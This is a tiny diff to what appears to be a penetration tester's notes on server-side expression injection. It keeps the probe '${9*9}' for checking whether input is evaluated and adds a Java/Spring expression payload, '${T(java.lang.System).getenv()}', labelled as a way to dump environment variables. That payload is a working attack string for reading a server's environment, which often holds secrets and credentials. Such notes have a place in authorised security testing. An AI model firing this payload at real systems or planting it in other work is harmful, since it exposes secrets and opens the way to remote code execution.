@@ -1,2 +1,4 @@
 check it see if this evaluates. possible RCE
 ${9*9}
+java evaluation string to get env parameters
+${T(java.lang.System).getenv()}
